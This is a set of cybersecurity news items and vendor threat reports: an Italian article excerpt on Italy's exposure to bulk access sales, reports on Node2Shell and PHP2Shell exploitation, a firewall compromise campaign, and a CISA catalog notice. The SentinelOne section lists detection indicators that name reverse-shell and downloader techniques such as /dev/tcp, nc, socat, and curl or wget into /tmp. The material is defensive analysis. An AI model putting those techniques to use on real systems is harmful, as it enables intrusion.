Inoltre, i criminali informatici opportunisti stanno sfruttando in massa vulnerabilità note, diffuse e spesso piuttosto datate per mietere un numero maggiore di vittime in Italia rispetto ad altri paesi. «I dati che abbiamo visto la scorsa settimana da PHP2Shell, credo, confermano questa valutazione. L’Italia è il paese europeo con il maggior numero di versioni PHP 4, 5 e 7, che sono ormai fuori supporto», osserva Tiepolo.

«Ben il 90% delle offerte di accesso iniziale rivolte all’Italia sono quelle che chiamiamo “offerte all’ingrosso”», ipotizza. «Non si tratta di offerte mirate specificatamente all’Italia, ma semplicemente di sfruttamento delle vulnerabilità. La nostra valutazione è che l’Italia sia probabilmente più lenta di altri paesi nell’applicare le patch ai propri sistemi».

Teoria n. 2: un effetto rete del rischio informatico

Un’altra possibilità correlata è che l’Italia si trovi vittima di una sorta di effetto rete delle vulnerabilità informatiche. La logica è più o meno questa: se determinate tecnologie sono particolarmente diffuse in un paese come l’Italia e le organizzazioni sono lente nell’affrontare le vulnerabilità di tali tecnologie, allora quel paese diventa un’economia di scala attraente.

Come ha scritto Intel471 nel proprio rapporto: «Una volta che un attore sviluppa un metodo di sfruttamento efficace, può applicare tale metodo ad altri sistemi esposti senza dover condurre un’attività di ricognizione separata ed estesa contro ciascuna organizzazione. Ciò riduce lo sforzo necessario per compromettere aziende la cui dimensione o il cui profilo potrebbero altrimenti offrire un incentivo limitato per un’intrusione mirata».

I ricercatori non hanno potuto specificare esattamente a quali tecnologie, vulnerabilità o metodi di sfruttamento questa teoria possa riferirsi, ma hanno osservato che essa si inserisce nel dato secondo cui il 90% delle offerte di accesso iniziale alle organizzazioni italiane online viene venduto all’ingrosso.

Senza avallare specificatamente i dati o le conclusioni di Intel471, i rappresentanti della società di sicurezza informatica Cleafy, con sede a Milano, hanno dichiarato a Dark Reading di aver osservato modelli sostanzialmente simili.

«La nostra ricerca sulle minacce evidenzia effettivamente un modello correlato: gli autori degli attacchi riutilizzano strumenti, infrastrutture e tecniche per estendere le campagne a diversi obiettivi bancari italiani», ha scritto l’azienda via e-mail. Ha citato casi come il kit di iniezione web drIBAN, che gli autori degli attacchi hanno utilizzato per sfruttare il sistema di Posta Elettronica Certificata (PEC), ampiamente diffuso in Italia. Casi come quello di drIBAN «non dimostrano che l’Italia abbia un mercato di accesso iniziale sproporzionatamente ampio, ma illustrano come le tecniche di attacco e le infrastrutture riutilizzabili possano aiutare i criminali informatici a estendere le operazioni su più obiettivi».

Teoria n. 3: le piccole e medie imprese spostano i dati

C’è un altro fattore, potenzialmente significativo, che spiega perché l’Italia appaia così diversa dagli altri paesi nei set di dati sugli attacchi informatici: la prevalenza delle piccole imprese.

La maggior parte delle imprese, ovunque, è di piccole dimensioni, ma, almeno rispetto ad altre economie avanzate, ciò è particolarmente vero in Italia. Una “panoramica dei dati per l’Italia” del maggio 2024 redatta da McKinsey ha rilevato che le “MSME” — micro, piccole e medie imprese — hanno contribuito all’economia e all’occupazione italiane in misura superiore di circa il 10% rispetto alla loro quota relativa in altre economie avanzate. Lo scorso marzo, inoltre, l’Organizzazione per la cooperazione e lo sviluppo economico (OCSE) ha pubblicato un rapporto in cui si indicava che nel 2023 il 99,9% delle imprese italiane era costituito da PMI e il 94,8% da microimprese.

«L’Italia ha molte piccole e medie imprese», afferma Tiepolo. «Una delle cose emerse dai dati — in particolare quelli relativi alle estorsioni — è che questi gruppi prendono di mira [in modo sproporzionato] le piccole e medie imprese. Quindi questo potrebbe essere uno dei motivi per cui [l’Italia si distingue] rispetto ad altri paesi che hanno un maggior numero di grandi aziende».

Title: Stopping Node2Shell: How SentinelOne Protects Customers From Brotli-Based Remote Code Execution
Context: Exploitation in the Wild Exploitation attempts have been recorded, but a successful attack on a production system has not been publicly reported as of October 29, 2026
Full Text:
Executive Summary

On October 21, 2026, the Node.js project released security updates that fix CVE-2026-111497, an out-of-bounds write in the Brotli decoder bundled with the runtime. Vendors have labeled the vulnerability Node2Shell, Brotli2Shell, Broccoli2Shell, and HTTP2Shell, because the flaw sits in Google's Brotli library and reaches software well beyond Node.js. Any application that decompresses attacker-controlled data with a vulnerable Brotli library could be at risk. Google, as the CVE Numbering Authority, scored it 9.2 under CVSS v4.0, and Node.js rates it high.

CISA added CVE-2026-111497 to its Known Exploited Vulnerabilities (KEV) catalog on October 27, 2026, with a November 10, 2026 deadline for federal civilian agencies. The public telemetry we reviewed shows exploitation attempts against honeypot sensors, and researchers have demonstrated code execution in lab environments. As of October 29, 2026, we are not aware of a public report of a confirmed compromise of a production system.

This report details Node2Shell's mechanism, affected versions, and observed activity, and outlines how SentinelOne customers and partners can strengthen their defenses.

Key Highlights

One flaw, many patches. Node.js, Google Brotli, Bun, .NET, Python, Envoy, Istio, and PHP for Windows each shipped their own fix. Updating one does not update the others.

Attempts are confirmed. Production compromise is not. ELLIO and Previdian have each recorded an exploitation attempt against their honeypot sensors. Previdian notes that such observations do not show the target was vulnerable or that the attempt succeeded.

A default Node.js server is not exposed by itself. Something must hand attacker-controlled Brotli data to the decoder. Node.js names direct node:zlib use. Express 5 request bodies and built-in fetch() responses reach the same decoder, and Imperva reproduced both in the lab.

A failed exploit still costs you. The Node.js advisory lists a crash as an outcome, and Sysdig reports that crashes have been easy to reproduce. Repeated crashes are a denial of service against any service that decodes attacker-influenced Brotli.

The fix was visible for nearly eight months before release. Google committed it on February 27, 2026, with no release and no advisory. End-of-life Node.js 20, 23, and 25 are not expected to receive a fix.

Organizations should take the following steps immediately:

Upgrade Node.js to 22.23.4, 24.22.1, or 26.12.1, then restart processes and rebuild container images.

Inventory every other runtime and library that embeds the Brotli decoder, and patch internet-facing services first.

Where patching must wait, reject inbound requests that carry Content-Encoding: br at the proxy or load balancer.

What is Node2Shell

Node2Shell is a memory corruption flaw in the Brotli decoder, the code that expands Brotli-compressed data. A Brotli stream signals switches between block types. When a stream declares only one block type, a switch is invalid and the decoder should reject it. The vulnerable decoder instead reported the invalid switch as a request for more input. The caller supplied more bytes, and the decoder kept appending them to an eight-byte internal buffer and wrote past its end, according to the Node.js advisory.

Node.js lists the outcomes as a crash, disclosure of process memory, or remote code execution, and the CVE record describes the attacker as unauthenticated. Imperva demonstrated code execution on the official Node.js 24.22.0 arm64 image. Microsoft describes the .NET impact as information disclosure, denial of service, or elevation of privilege.

Node2Shell at a Glance

Attribute

Weakness

Unchecked return value (CWE-252) leading to an out-of-bounds write (CWE-787). No authentication required.

Severity

CVSS v4.0 9.2 (Google, CNA). Node.js: high.

Affected Component

How Attacker-Controlled Brotli Reaches the Decoder

Path

Condition

Inbound request bodies

Routes that use express.json(), express.urlencoded(), express.text(), or express.raw() in Express 5 or body-parser 2 decompress bodies sent with Content-Encoding: br by default. Any client can send one.

Outbound responses

Built-in fetch() decodes Brotli automatically, so a malicious or compromised server can target the client.

Direct calls

Applications that pass untrusted input to zlib.brotliDecompress() or zlib.createBrotliDecompress().

Disclosure Timeline

Date (2026)

Event

October 21

October 22

October 25

October 27

Exploitation in the Wild

Exploitation attempts have been recorded, but a successful attack on a production system has not been publicly reported as of October 29, 2026. CISA added CVE-2026-111497 to its KEV catalog on October 27, 2026, with a November 10, 2026 deadline for federal civilian agencies under BOD 26-04.

The public telemetry comes from honeypots. Two threat intelligence providers each recorded an attempt: ELLIO saw a request built for Node.js 24.22.0 on x86-64 on October 26, and Previdian saw one from a U.S.-based address on October 27. Previdian notes that such observations do not show the target was vulnerable or that the attempt succeeded.

Researchers have reproduced code execution only in lab testing. Imperva ran code on the official Node.js 24.22.0 arm64 image through fetch() and Express 5 request bodies, needed multiple attempts, and did not test every Node.js build. Public proof-of-concept code appeared within hours of the October 21 release, according to Sysdig, so organizations should expect further attempts, particularly against internet-facing Express 5 services.

Patch Status

Node.js has fixed every supported release line: 22.x, 24.x, and 26.x. It will not patch end-of-life lines, which the project says are always affected when a security release occurs. Organizations running Node.js 20, 23, or 25 have no patch to apply and must upgrade to a supported line.

Recommended Mitigations

Patch, Restart, and Rebuild

Upgrade to a fixed Node.js release, update every Dockerfile that pins an older tag, and restart or redeploy every workload.

Confirm patch status from the Node.js release version running in each workload, not a bundled library version string, which may not reflect a backported fix.

Find Every Copy of the Decoder

Inventory Bun, .NET, Python Brotli, Envoy, Istio, PHP for Windows, and statically built executables, including staging, CI, build images, and developer machines.

Where Node.js links the system Brotli library, as it does on Debian, check your distribution’s advisory for the Node.js package as well as brotli. Debian’s tracker lists both.

PHP for Windows fixed the flaw with rebuilt packages that keep the same PHP version number, so php -v looks the same before and after. Check the -1 build suffix or the SHA-256 on the download page.

Move off Node.js 20, 23, and 25 on a defined date.

Reduce Exposure Until Patching Finishes

Reject requests with Content-Encoding: br at the WAF or proxy, or set the body-parser inflate option to false so compressed bodies return HTTP 415. The second option also rejects gzip and deflate bodies, so test client traffic first.

Restrict server-side fetches to trusted destinations. Link previews, webhooks, and crawlers send attacker-influenced URLs into fetch(), and removing br from Accept-Encoding does not stop a hostile server from replying with Brotli.

Enable a vendor WAF rule as a stopgap where one exists. It does not replace the upgrade.

Limit the Blast Radius

Run Node.js services as a non-root user and limit outbound connections from Node.js hosts. Docker runs containers as root by default, and the official node image provides a node user (uid 1000) that you must select with USER or -u.

Watch for Failed Attempts

Alert on repeated worker crashes after requests with Content-Encoding: br. Where core dumps are enabled, restrict who can read them and shorten retention, because a core file can hold memory contents from other users’ sessions.

How SentinelOne Protects You

Node2Shell exploits the Brotli decoder inside the Node.js process. Patching Node.js and every other copy of the Brotli decoder remains the primary control. SentinelOne provides detection and visibility into post-exploitation behavior while that work is underway.

The Singularity agent builds a storyline of process activity on a host, including the Node.js services targeted by Node2Shell. These processes have a predictable life: they answer requests, call APIs, and read files. They do not normally start /bin/sh, run reconnaissance commands, download executables into /tmp, or open connections to arbitrary hosts. Behavioral detection looks for that deviation from normal behavior.

Detection in Singularity AI SIEM

Platform detection content looks at what happens on the host after exploitation, not at the request body.

Attacker Step

Telemetry

Visible Indicators

Code execution in the service

Process creation

Shell processes whose lineage or prior image is node, nodejs, or bun, including an in-place exec, followed by enumeration utilities (id, whoami, uname, hostname) or sensitive file reads

Tooling download

Process creation, File creation

Downloaders (curl, wget, interpreters) fetching to world-writable paths, and executables written and then run from /tmp

Files written by the service

File creation

A Node.js service account writing new executables or scripts outside its normal application paths

Shell and C2

Process creation, IP Connect

Shell processes with a socket as standard input or output, socket-redirection patterns (/dev/tcp, nc, socat), and unexpected outbound connections from Node.js service accounts

Novel child process

First-seen analytics

A Node.js process that starts or becomes a shell or image it has never run in that environment

Correlation rules tie these together. A request to the service, or an outbound fetch to an untrusted host, followed by a process spawn or file drop from the same Node.js process is the shape of a successful chain.

Visibility at the Edge

Sysdig reports that the crash is easy to reproduce, which makes repeated worker crashes and restarts a useful early signal. Web server, WAF, and CDN logs may show requests with Content-Encoding: br followed by bursts of HTTP 5xx responses and unexplained worker restarts. Singularity AI SIEM can ingest those sources alongside endpoint data if you forward them.

Hunt with Purple AI While You Patch

Patching is the only complete fix. While that work runs, analysts can ask Purple AI questions such as:

Show me shell processes whose parent or prior image was node, nodejs, or bun since October 21.

Show me new executable files written by the Node.js service account since October 21.

Show me outbound connections from the Node.js service account to destinations we have never seen.

Show me hosts with a spike in 500 responses followed by a Node.js process restart.

The last question depends on web server logs being ingested.

Confirm Agent Saturation on Node.js Hosts

Confirm the agent is deployed, healthy, and in protect mode on every server and container host that runs Node.js, Bun, or another service that decompresses Brotli. Start with internet-facing Express 5 services and services that fetch external URLs.

Title: Cato CTRL Threat Research: PHP2Shell Exploitation Attempts in the Wild, and How Cato IPS Blocked Them
Context: The first scanning or invalid-PoC attempt appeared on 21 October, the day the fixes were released, and about two thirds of all attack sources in our sample first appeared that day
Full Text:
Executive summary

On 21 October 2026, PHP released fixes for CVE-2026-109618 and CVE-2026-109619, a pair of critical runtime vulnerabilities known as PHP2Shell. One day later, we described how our self-evolving CVE mitigation agent turned the patch into reviewed IPS protection in minutes. This report follows what happened next, including how quickly attackers moved, what their attempts looked like, and how Cato’s cloud-delivered IPS protection blocked them on inspected customer traffic.

Key findings

Attempts started on patch day. We observed no external PHP2Shell-pattern requests from 17 to 20 October. The first scanning or invalid-PoC attempt appeared on 21 October, the day the fixes were released, and about two thirds of all attack sources in our sample first appeared that day.

Cato IPS blocked both exploitation attempts and scanning or invalid-PoC attempts. In the sample analyzed, about 41% of blocked attempts were exploitation attempts aimed at remote code execution (RCE), and 59% were scanning or invalid-PoC attempts. About 96% of all hits related to CVE-2026-109618.

Exploitation attempts fell into two main types. Command-execution attempts were the most common, followed by deserialization attempts.

A handful of sources drove most attempts. In our sample, a small number of source IPs generated most of the blocked attempts, repeating proof-of-concept (PoC) style requests.

Attempts appear opportunistic, not sector-focused. Healthcare made up about one third of the organizations that received blocked attempts, but the same sources reached unrelated sectors and countries.

Introduction

PHP2Shell is a pair of flaws in the PHP core runtime rather than in a single application or plugin. CVE-2026-109618 concerns out-of-memory handling that can interrupt request initialization and leave invalid data for cleanup to process. CVE-2026-109619 concerns request-owned state that is retained after its memory is freed and later accessed by the same worker. Both can lead to unauthenticated code execution, and the highest demonstrated risk is in Apache mod_php, where exploitation can occur before any application code runs.

In our first threat brief, Cato AI native SASE delivers PHP2Shell protection at machine speed, we described how our self-evolving CVE mitigation agent built a PoC and generated IPS signatures in minutes, with researcher review before release. At that point, our initial telemetry showed scanning activity only.

This follow-up answers the questions security teams ask next. Once the patch was public, how fast did attackers move, what did they try, and did protection keep up? We look at timing, attempt types, sources, the industries that received attempts, and the tooling involved.

Methodology

We queried a sample of anonymized, aggregated Cato cloud security telemetry from 17 to 26 October 2026 for inbound requests matching the PHP2Shell pattern and our PHP2Shell IPS protections. We group blocked attempts into two categories, exploitation attempts and scanning or invalid-PoC attempts. The second category covers simple scanning as well as exploit attempts that used false or invalid proofs of concept. Results are shown as approximate percentages, and industries are grouped so that no individual organization can be identified.

Limitations

Sample-based. The figures reflect a sample of Cato-inspected traffic, not global internet activity, and show the shape of activity rather than exact volumes.

Attempts, not outcomes. This research describes attempted attacks, not compromises.

Geolocation is not attribution. Source country reflects where an IP is hosted, often a cloud or VPS provider, not who operates it.

Technical insights

1. Timeline from silence to patch-day onset

Figure 1 shows the clearest finding. From 17 to 20 October, we observed no external requests matching the PHP2Shell pattern. On 21 October, the day PHP published its fixes, the first external scanning or invalid-PoC attempt appeared in the morning, and that day accounts for about 72% of the PHP2Shell-pattern requests in our sample. This is consistent with Amazon Threat Intelligence, which reported proof-of-concept exploits circulating on 21 October. Amazon also reported a single exploitation attempt against its own honeypots on 17 October, four days before public disclosure. We saw no such pre-disclosure activity in Cato customer traffic.

Figure 1. Daily share of external PHP2Shell-pattern requests across the observation window.

Daily volume is spiky because one noisy scanner can dominate a day. A better measure of how activity spread is when each attack source first appeared. In Figure 2, 100% represents all attack sources observed during the study window. About two thirds of them first appeared on 21 October, and new sources appeared on most days after.

Figure 2. Attack sources by first-seen date, as a share of all sources observed in the window.

Hour by hour, 21 October unfolded in two phases (Figure 3). A few early scanning or invalid-PoC attempts in the morning were followed in the afternoon by a single source sending a burst that made up about 80% of the day’s requests. Later in the day, activity fanned out, with about 40% of the day’s sources active within a single hour, which is typical of a PoC circulating and many operators running it at once.

Figure 3. Share of requests and of active sources per hour on 21 October.

2. From scanning and invalid PoCs to code execution attempts

In the sample analyzed, about 96% of blocked attempts related to CVE-2026-109618, the out-of-memory flaw, and about 4% to CVE-2026-109619. About 59% were scanning or invalid-PoC attempts, and 41% were exploitation attempts aimed at remote code execution (Figure 4). Some attempts relied on PoCs that were not valid against the vulnerable code path, so we grouped them with scanning activity. Exploitation attempts fell into two main types, command execution and deserialization, with command execution the more common.

Figure 4. Blocked PHP2Shell attempts by CVE and by intent, based on a sample of Cato telemetry.

3. Source geography

Based on a sample of the sources we observed, the United States leads by share of source IPs (about 36%), followed by the Netherlands and Germany (about 14% each). By share of blocked attempts, US-hosted sources account for about 54%, the Netherlands about 18% and Moldova about 16% (Figure 5). Activity was concentrated, with a small number of sources generating most of the blocked attempts in the sample.

Figure 5. Source IP geolocation by share of sources and share of blocked attempts, based on a sample of sources.

4. Who received the attempts

Blocked attempts reached organizations across a broad range of industries (Figure 6). Healthcare and social care is the largest group at about one third, followed by technology and security services. The remainder is spread across professional services, automotive, education and non-profit, and other sectors, in several countries.

Figure 6. Industry mix of the organizations that received blocked attempts.

Does the healthcare share mean healthcare was singled out? The evidence suggests not. The same sources sent attempts to healthcare organizations and to unrelated sectors in different countries. For example, a single source reached healthcare, technology and software organizations on the same day. The sample is small, and the share may also reflect the composition of our customer base. One plausible explanation is shared technology. PHP-based portals, forms and line-of-business applications are common across many industries, including healthcare.

Additional recommendation

Cato customers do not need to deploy anything for PHP2Shell protection. The IPS signatures are delivered and enforced from our cloud. We also recommend updating every PHP instance to the fixed version released by the PHP project.

Conclusion

PHP2Shell showed how short the window between patch and attack has become. We saw no PHP2Shell-pattern traffic for four days, then scanning or invalid-PoC attempts on the day the fixes were released, followed by exploitation attempts. The attempts were automated, repetitive and opportunistic, reaching organizations across many industries and countries. With a runtime-level bug, the deciding factor is whether an organization exposes PHP, not which industry it is in.

Dedicated PHP2Shell signatures, built by our self-evolving CVE mitigation agent and reviewed by our researchers, blocked exploitation attempts on inspected traffic. Because enforcement happens in the Cato cloud, customers did not need to install anything, and this virtual patching reduces exposure while application owners upgrade.

This research covers a sample of attempts on inspected traffic, not outcomes, during the first days after disclosure.

We will continue to monitor PHP2Shell activity and update protections as attacker techniques evolve.

Title: Chinese Actor Compromises US Government Network Via Chained PHP2Shell Exploit
Context: The attacker invested significant effort into vulnerability research — obtaining PAN-OS firmware, decrypting it, extracting PHP libraries, building precise memory profiles for 9...
Full Text:
A suspected Chinese nation-state actor chained the PHP2Shell exploit with a Linux kernel privilege-escalation vulnerability to gain root access to 25 Palo Alto Network (PAN) firewall and management servers.

The campaign rooted 25 PAN servers across the United States, Japan, Taiwan, and South Korea, according to an investigation by cyber defense platform provider Dream.

There was a particular focus on three specific servers in a US government-affiliated environment, resulting in persistent access to a US government organization's internal Active Directory domain.

The Dream researchers noted a number of indicators of Chinese nation-state involvement in the campaign, including the narrow focus of the targeting.

“Since US, Japan, Taiwan, and South Korea are the four primary strategic adversaries and intelligence targets for Chinese state-aligned cyber operations in the Pacific theater, this indicates potential nation-state adversary efforts,” they commented.

In addition, a number of tools used in the campaign, such as the large language models (LLMs) DeepSeek and Kimi, and the internet reconnaissance platform FOFA, are Chinese-based services.

The Dream researchers highlighted the “automated and efficient” nature of the exploits, which took place from 23-24 October, including the targeting of specific PAN-OS versions.

“This operation demonstrates a level of preparation and capability that sets it apart from opportunistic exploitation. The attacker invested significant effort into vulnerability research — obtaining PAN-OS firmware, decrypting it, extracting PHP libraries, building precise memory profiles for 9 different software versions, and calibrating exploit geometry through lab testing,” they said.

“There was a clear-cut focus on government targets,” the researchers added.

Palo Alto Networks Confirm Compromise

Palo Alto Networks’ Unit 42 verified Dream’s findings in a blog published on October 29. It said that around .02% of its global installed base has internet-facing management interfaces configured and were impacted by the campaign.

All the affected devices run specific versions of Palo Alto Networks PAN-OS.

“Each of these customers has been individually contacted by our teams. We will continue to investigate and provide any necessary updates as they become available,” Unit 42 wrote.

Palo Alto Networks has recommended that customers review its mitigations for CVE-2026-109618 and CVE-2026-109619 and apply patches immediately.

Chained Exploits Achieves Access in Under 15 Minutes

The attackers developed two separate exploits and chained them together into one request to target the PAN-OS servers. One of these was the widely reported ‘PHP2Shell’ exploit, made up of two vulnerabilities tracked as CVE-2026-109618 and CVE-2026-109619.

The exploit, which affects the PHP server-side programming language used by around 70% of websites, was leaked in October before a scheduled disclosure and release of patches. This resulted in many websites being taken down, including by governments, while emergency fixes were applied.

Read now: PHP2Shell Exploitation Attempt Detected by Amazon Four Days Before Vulnerability Disclosure

In the campaign identified by Dream, the threat actors tailored the exploit specifically for PAN-OS, targeting PHP's session.upload_progress mechanism on the PAN-OS management web server.

This was chained to a second exploit, a Linux kernel vulnerability in the XFRM ESP-in-TCP subsystem known as Fragnesia and tracked as CVE-2026-46300. The attackers used this flaw to overwrite authentication rules, allowing root access to be achieved without a password.

“Both exploits run in a single B2 HTTP request. The total chain — from unauthenticated HTTPS connection to persistent root webshell — completes in under 15 minutes,” Dream explained.

Threat Actor Narrows Focus to US Government Servers

Once the exploit was ready, the attacker identified approximately 19,000 internet-facing PAN-OS firewalls worldwide. It narrowed down its targeting through a number of stages, using scanners to identify which devices were connected to the internet, their geographic location and what PAN-OS version they were running. The latter was focused on the PAN-OS 12.1 and 12.2 branches running PHP 8.0.30.

This produced a final target list of 240 firewalls located in the US, Japan, Taiwan and South Korea.

These targets were fed into an automated batch runner that exploited them five at a time, with an 1800-second (30-minute) timeout per target.

Of the 240 targets, 24 firewalls were successfully rooted. For 22 of the 24 rooted firewalls, the attacker only planted a webshell and did not carry out any further post-exploitation activity.

However, the two other firewalls, which belonged a US government-affiliated environment, saw the attackers establish persistent access. This included building an 8-port reverse SSH tunnel, which connected the compromised firewall back to the operator's infrastructure.

The attackers quickly used its access to one of the government servers to compromise a third government server via same PHP2Shell and Fragnesia exploit chain. This brought the total number of servers exploited to 25.

As this third server centrally managed all of the government organization’s firewalls, compromising it gave the attacker access to every managed firewall's configuration, credentials and network settings.

This allowed the threat actor to exploit the server’s connectivity to Active Directory to steal data such as credentials, although the researchers cannot determine the full extent of the accessed data.

“What we cannot determine is whether the password spray, backdoor account creation, or SAML key extraction succeeded. If any of these attacks worked, the compromise extends far beyond the perimeter firewalls into the organization's identity infrastructure,” they warned.

Dream said the campaign demonstrates that finding a vulnerability is only one part of identifying weaknesses across an organization’s systems, particularly with the growing use of chained exploits.

“Defenders need to identify exposed systems, establish what attackers can exploit, and act before a foothold becomes a wider compromise,” the firm added.

Title: CISA Adds Two Known Exploited Vulnerabilities to Catalog
Context: While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog...
Full Text:
CISA has added two new vulnerabilities to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation.

CVE-2026-111357 Ivanti Connect Secure Missing Authentication for Critical Function Vulnerability

CVE-2026-118527 Ivanti Connect Secure Generation of Predictable Numbers or Identifiers Vulnerability

These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise.

Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied.

While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria.

Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form. Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.
